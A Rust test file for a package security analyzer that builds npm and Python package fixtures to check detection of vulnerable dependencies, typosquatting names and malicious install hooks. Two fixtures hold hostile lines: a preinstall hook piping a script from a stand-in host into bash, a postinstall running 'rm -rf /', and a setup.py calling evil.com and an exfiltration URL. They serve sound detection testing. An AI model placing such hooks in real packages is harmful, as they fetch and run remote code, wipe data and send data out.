//! Comprehensive tests for package security analysis

use std::fs;
use tempfile::TempDir;
use threatflux_package_security::{PackageSecurityAnalyzer, RiskLevel};

// Helper to create test package files
fn create_npm_package(dir: &TempDir, package_json: &str) {
    fs::write(dir.path().join("package.json"), package_json).unwrap();
}

fn create_python_package(dir: &TempDir, setup_py: &str, requirements_txt: Option<&str>) {
    fs::write(dir.path().join("setup.py"), setup_py).unwrap();
    if let Some(requirements) = requirements_txt {
        fs::write(dir.path().join("requirements.txt"), requirements).unwrap();
    }
}

#[tokio::test]
async fn test_npm_package_vulnerability_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with known vulnerable dependencies
    let vulnerable_package = r#"{
        "name": "vulnerable-test-package",
        "version": "1.0.0",
        "description": "Test package with vulnerabilities",
        "dependencies": {
            "lodash": "4.0.0",
            "moment": "2.10.0",
            "express": "3.0.0"
        },
        "devDependencies": {
            "mocha": "1.0.0"
        }
    }"#;

    create_npm_package(&temp_dir, vulnerable_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    assert_eq!(result.package_info().package_type(), "npm");
    assert_eq!(result.package_info().name(), "vulnerable-test-package");
    assert_eq!(result.package_info().metadata().version, "1.0.0");

    // Check that analysis completed successfully (vulnerabilities may or may not be found)
    let vulnerabilities = result.vulnerabilities();
    println!("Found {} vulnerabilities", vulnerabilities.len());

    // The analysis should complete without errors
    assert!(result.overall_risk_level() >= RiskLevel::Safe);
}

#[tokio::test]
async fn test_npm_package_malicious_patterns() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with suspicious scripts
    let suspicious_package = r#"{
        "name": "suspicious-test-package",
        "version": "1.0.0",
        "description": "Package with suspicious behavior",
        "scripts": {
            "preinstall": "curl -s http://malicious.com/script.sh | bash",
            "postinstall": "node -e \"require('child_process').exec('rm -rf /')\""
        },
        "dependencies": {
            "express": "^4.18.0"
        }
    }"#;

    create_npm_package(&temp_dir, suspicious_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    // Check that analysis detects some risk (may be medium or high)
    assert!(
        result.overall_risk_level() >= RiskLevel::Medium,
        "Should have elevated risk due to suspicious scripts"
    );

    let malicious_indicators = result.malicious_indicators();
    println!("Found {} malicious indicators", malicious_indicators.len());

    // Print detected patterns for debugging
    for indicator in malicious_indicators {
        println!(
            "Pattern: {} - {}",
            indicator.pattern_name, indicator.description
        );
    }
}

#[tokio::test]
async fn test_npm_typosquatting_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Create packages with names similar to popular packages
    let typosquatting_cases = vec![
        ("loadash", "Similar to lodash"),
        ("expres", "Similar to express"),
        ("reqeust", "Similar to request"),
        ("momnet", "Similar to moment"),
    ];

    for (suspicious_name, _description) in typosquatting_cases {
        let package_json = format!(
            r#"{{
            "name": "{}",
            "version": "1.0.0",
            "description": "Potentially typosquatting package"
        }}"#,
            suspicious_name
        );

        create_npm_package(&temp_dir, &package_json);

        let analyzer = PackageSecurityAnalyzer::new().unwrap();
        let result = analyzer.analyze(temp_dir.path()).await.unwrap();

        // Should detect typosquatting risk
        if let Some(typo_risk) = result.typosquatting_risk() {
            assert!(
                typo_risk.is_potential_typosquatting(),
                "Should detect typosquatting for {}",
                suspicious_name
            );
            assert!(
                !typo_risk.similar_packages().is_empty(),
                "Should find similar legitimate packages"
            );
        }
    }
}

#[tokio::test]
async fn test_python_package_vulnerability_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Create Python package with known vulnerable dependencies
    let vulnerable_setup = r#"
from setuptools import setup

setup(
    name="vulnerable-python-package",
    version="1.0.0",
    description="Python package with vulnerabilities",
    install_requires=[
        "django==1.11.0",
        "flask==0.12.0",
        "requests==2.6.0",
        "pillow==3.0.0"
    ]
)
"#;

    let vulnerable_requirements = r#"
django==1.11.0
flask==0.12.0
requests==2.6.0
pillow==3.0.0
"#;

    create_python_package(&temp_dir, vulnerable_setup, Some(vulnerable_requirements));

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    assert_eq!(result.package_info().package_type(), "python");
    assert_eq!(result.package_info().name(), "vulnerable-python-package");

    // Check that analysis completed successfully
    let vulnerabilities = result.vulnerabilities();
    println!(
        "Found {} vulnerabilities in Python package",
        vulnerabilities.len()
    );

    // The analysis should complete without errors
    assert!(result.overall_risk_level() >= RiskLevel::Safe);
}

#[tokio::test]
async fn test_python_malicious_setup_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Create Python package with malicious setup.py
    let malicious_setup = r#"
import subprocess
import urllib.request
from setuptools import setup

# Malicious code in setup.py
subprocess.run(['curl', '-s', 'http://evil.com/steal.sh'], shell=True)
urllib.request.urlopen('http://malicious.com/exfiltrate')

setup(
    name="malicious-python-package",
    version="1.0.0",
    description="Package with malicious setup",
    install_requires=["requests"]
)
"#;

    create_python_package(&temp_dir, malicious_setup, None);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    // Should detect malicious patterns in setup.py
    assert!(
        result.overall_risk_level() >= RiskLevel::High,
        "Should have high risk due to malicious setup.py"
    );

    let malicious_indicators = result.malicious_indicators();
    assert!(
        !malicious_indicators.is_empty(),
        "Should detect malicious indicators in setup.py"
    );

    // Should detect specific dangerous patterns
    let has_network_access = malicious_indicators
        .iter()
        .any(|i| i.description.contains("network") || i.description.contains("urllib"));
    assert!(
        has_network_access,
        "Should detect network access in setup.py"
    );
}

#[tokio::test]
async fn test_python_typosquatting_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Test Python packages with names similar to popular packages
    let typosquatting_cases = vec![
        ("reqeusts", "Similar to requests"),
        ("beatifulsoup", "Similar to beautifulsoup4"),
        ("pillow-pillow", "Similar to pillow"),
        ("sklern", "Similar to sklearn"),
    ];

    for (suspicious_name, _description) in typosquatting_cases {
        let setup_py = format!(
            r#"
from setuptools import setup

setup(
    name="{}",
    version="1.0.0",
    description="Potentially typosquatting package"
)
"#,
            suspicious_name
        );

        create_python_package(&temp_dir, &setup_py, None);

        let analyzer = PackageSecurityAnalyzer::new().unwrap();
        let result = analyzer.analyze(temp_dir.path()).await.unwrap();

        // Should detect typosquatting risk
        if let Some(typo_risk) = result.typosquatting_risk() {
            if typo_risk.is_potential_typosquatting() {
                assert!(
                    !typo_risk.similar_packages().is_empty(),
                    "Should find similar legitimate packages for {}",
                    suspicious_name
                );
            }
        }
        // Note: Typosquatting detection might not catch all cases - that's acceptable
    }
}

#[tokio::test]
async fn test_benign_package_analysis() {
    let temp_dir = TempDir::new().unwrap();

    // Create a benign package with up-to-date dependencies
    let benign_package = r#"{
        "name": "benign-test-package",
        "version": "1.0.0",
        "description": "A completely safe test package",
        "author": "Test Author <test@example.com>",
        "license": "MIT",
        "dependencies": {
            "lodash": "^4.17.21",
            "express": "^4.18.2"
        },
        "devDependencies": {
            "mocha": "^10.0.0",
            "chai": "^4.3.0"
        },
        "scripts": {
            "test": "mocha",
            "start": "node index.js"
        }
    }"#;

    create_npm_package(&temp_dir, benign_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    // Should be assessed as safe or low risk
    assert!(
        result.overall_risk_level() <= RiskLevel::Low,
        "Benign package should have low risk"
    );

    // Should not be flagged as typosquatting
    if let Some(typo_risk) = result.typosquatting_risk() {
        assert!(
            !typo_risk.is_potential_typosquatting(),
            "Benign package should not be flagged as typosquatting"
        );
    }

    // Should have minimal malicious indicators
    let malicious_indicators = result.malicious_indicators();
    assert!(
        malicious_indicators.is_empty() || malicious_indicators.len() <= 1,
        "Benign package should have minimal malicious indicators"
    );
}

#[tokio::test]
async fn test_supply_chain_risk_assessment() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with many dependencies (supply chain risk)
    let complex_package = r#"{
        "name": "complex-dependency-package",
        "version": "1.0.0",
        "description": "Package with many dependencies",
        "dependencies": {
            "express": "^4.18.0",
            "lodash": "^4.17.21",
            "moment": "^2.29.0",
            "axios": "^1.0.0",
            "react": "^18.0.0",
            "react-dom": "^18.0.0",
            "webpack": "^5.0.0",
            "babel-core": "^6.26.0",
            "eslint": "^8.0.0",
            "jest": "^29.0.0"
        }
    }"#;

    create_npm_package(&temp_dir, complex_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    // Check supply chain risk assessment
    let supply_chain_score = result.supply_chain_risk_score();
    println!("Supply chain risk score: {}", supply_chain_score);

    // Basic validation that score is within valid range
    assert!(supply_chain_score >= 0.0);
    assert!(supply_chain_score <= 100.0);
}

#[tokio::test]
async fn test_package_quality_metrics() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with quality indicators
    let quality_package = r#"{
        "name": "high-quality-package",
        "version": "2.1.0",
        "description": "A well-maintained package with quality indicators",
        "author": "Quality Author <author@example.com>",
        "license": "MIT",
        "homepage": "https://github.com/example/high-quality-package",
        "repository": {
            "type": "git",
            "url": "https://github.com/example/high-quality-package.git"
        },
        "bugs": {
            "url": "https://github.com/example/high-quality-package/issues"
        },
        "keywords": ["utility", "helper", "quality"],
        "dependencies": {
            "lodash": "^4.17.21"
        },
        "devDependencies": {
            "mocha": "^10.0.0",
            "chai": "^4.3.0",
            "nyc": "^15.0.0"
        },
        "scripts": {
            "test": "mocha",
            "test-coverage": "nyc mocha",
            "lint": "eslint ."
        }
    }"#;

    create_npm_package(&temp_dir, quality_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    // Check that quality metrics are available (even if basic)
    let quality_metrics = result.quality_metrics();
    println!(
        "Documentation score: {}",
        quality_metrics.documentation_score()
    );
    println!("Has tests: {}", quality_metrics.has_tests());
    println!("Has CI/CD: {}", quality_metrics.has_ci_cd());

    // Basic validation that metrics are returned
    assert!(quality_metrics.documentation_score() >= 0.0);
    assert!(quality_metrics.documentation_score() <= 1.0);
}

#[tokio::test]
async fn test_error_handling() {
    let analyzer = PackageSecurityAnalyzer::new().unwrap();

    // Test with nonexistent directory
    let result = analyzer.analyze("nonexistent_directory").await;
    assert!(result.is_err(), "Should fail for nonexistent directory");

    // Test with empty directory
    let empty_dir = TempDir::new().unwrap();
    let result = analyzer.analyze(empty_dir.path()).await;
    assert!(
        result.is_err(),
        "Should fail for directory with no package files"
    );

    // Test with invalid JSON
    let invalid_dir = TempDir::new().unwrap();
    fs::write(invalid_dir.path().join("package.json"), "invalid json {").unwrap();
    let result = analyzer.analyze(invalid_dir.path()).await;
    assert!(result.is_err(), "Should fail for invalid JSON");
}

#[test]
fn test_risk_level_comparisons() {
    use threatflux_package_security::RiskLevel;

    // Test ordering
    assert!(RiskLevel::Safe < RiskLevel::Low);
    assert!(RiskLevel::Low < RiskLevel::Medium);
    assert!(RiskLevel::Medium < RiskLevel::High);
    assert!(RiskLevel::High < RiskLevel::Critical);

    // Test equality
    assert_eq!(RiskLevel::Safe, RiskLevel::Safe);
    assert_eq!(RiskLevel::Critical, RiskLevel::Critical);

    // Test inequality
    assert_ne!(RiskLevel::Safe, RiskLevel::Critical);
    assert_ne!(RiskLevel::Low, RiskLevel::High);
}

#[tokio::test]
async fn test_vulnerability_severity_classification() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with known critical vulnerabilities
    let critical_vuln_package = r#"{
        "name": "critical-vuln-package",
        "version": "1.0.0",
        "description": "Package with critical vulnerabilities",
        "dependencies": {
            "node-serialize": "0.0.4",
            "handlebars": "4.0.5"
        }
    }"#;

    create_npm_package(&temp_dir, critical_vuln_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    let vulnerabilities = result.vulnerabilities();
    if !vulnerabilities.is_empty() {
        // Check that vulnerabilities are properly classified
        for vuln in vulnerabilities {
            assert!(
                !vuln.cve_id().is_empty() || !vuln.advisory_id().is_empty(),
                "Vulnerability should have ID"
            );
            assert!(
                !vuln.description.is_empty(),
                "Vulnerability should have description"
            );
            assert!(
                vuln.severity_score() >= 0.0 && vuln.severity_score() <= 10.0,
                "Severity score should be valid CVSS range"
            );
        }
    }
}

// Additional security tests
#[tokio::test]
#[ignore = "requires zip bomb test data"]
async fn test_zip_bomb_protection() {
    // Test that zip bombs are detected and handled safely
    // This would need actual zip bomb test data
    todo!("Implement zip bomb protection test with actual test data");
}

#[tokio::test]
#[ignore = "requires path traversal test data"]
async fn test_path_traversal_protection() {
    // Test that package paths like ../../../etc/passwd are handled safely
    // This would need actual path traversal test data
    todo!("Implement path traversal protection test with actual test data");
}

#[tokio::test]
#[ignore = "requires large file test data"]
async fn test_large_file_handling() {
    // Test memory usage with large package files
    // This would need actual large file test data
    todo!("Implement large file handling test with actual test data");
}

#[tokio::test]
#[ignore = "requires vulnerable package test data"]
async fn test_vulnerability_detection_accuracy() {
    // Test against known vulnerable packages
    // Measure false positive/negative rates
    // This would need vulnerable package test data
    todo!("Implement vulnerability detection accuracy test with actual test data");
}

#[tokio::test]
#[ignore = "requires typosquatting test data"]
async fn test_typosquatting_detection_accuracy() {
    // Test against known typosquatting cases
    // Validate algorithm effectiveness
    // This would need typosquatting test data
    todo!("Implement typosquatting detection accuracy test with actual test data");
}
